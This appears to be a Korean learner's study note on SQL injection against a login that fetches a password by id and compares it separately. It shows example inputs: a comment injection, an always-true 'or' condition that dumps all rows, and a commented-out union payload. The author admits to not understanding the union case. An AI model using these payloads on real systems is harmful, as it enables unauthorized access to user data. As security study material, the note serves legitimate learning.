# 식별 & 인증 분리(SQL Injection)

SQL Injection 기법 중에서 식별과 인증을 분리하여 처리하는 케이스.

하단의 query문과 메커니즘을 사용한다는 것으로 가정한다.
```
select pass from member where id=''
```
```
if( db_pass == userinput_pass ){     
    로그인 성공    
}else      
```

query 문의 의미는 사용자가 입력한 id를 database 에서 검색해서 password 를 추출한다.

그리고 추출한 password 를 사용하자 입력한 password 와 비교하여 검증하는 방식이다.
</br>
</br>
</br>

# \# (주석) (의미없음)

id : mario'# 을 입력한다면 
```
id : mario'#
pw : 1234
```
</br>

query 문은 아래와 같이 적용될 것이다.
```
select pass from member where id='mario'#'
``` 
</br>

주석처리로 없어짐
```py
#'
```
</br>

실제로 실행되는 query
```
select pass from member where id='mario'
```
![5](https://user-images.githubusercontent.com/106296883/232677748-9f142f84-3193-4c49-a9bb-dc2cdc552b4e.PNG)

뭐가 다른 거지? 

분리에서의 주석처리는 의미없어 보인다.
</br>
</br>
</br>

# or

id : mario' or '1'='1 입력한다면
```
id : mario' or '1'='1
```
![6](https://user-images.githubusercontent.com/106296883/233332562-7d10d334-fd07-40ce-8710-9b729c467248.PNG)

모든 데이터가 나온다.

```
id : mario' or '1'='1

id : mario = TRUE
'1'='1'    = TRUE

select pass from member where TRUE
```
![7](https://user-images.githubusercontent.com/106296883/233333418-300babdb-6984-4817-ac8d-6d85386c10e0.PNG)
</br>
</br>
</br>

# union



## 분리는 전체적으로 잘 모르겠다.







































<!-- 

## or 
```
id : mario' union select 1,2,3,4 or'1'='1
pw : 1234
```
↓
```
select * from member where id='mario' union select 1,2,3,4 or'1'='1' and pass='1234'
```
↓
```
'1'='1' and pass='1234'

FALSE
```
↓
```
union select 1,2,3,4 or FALSE 

TRUE
```
![4](https://user-images.githubusercontent.com/106296883/232668683-066c15c5-a976-41b3-ab1c-daabafeab9be.PNG) -->
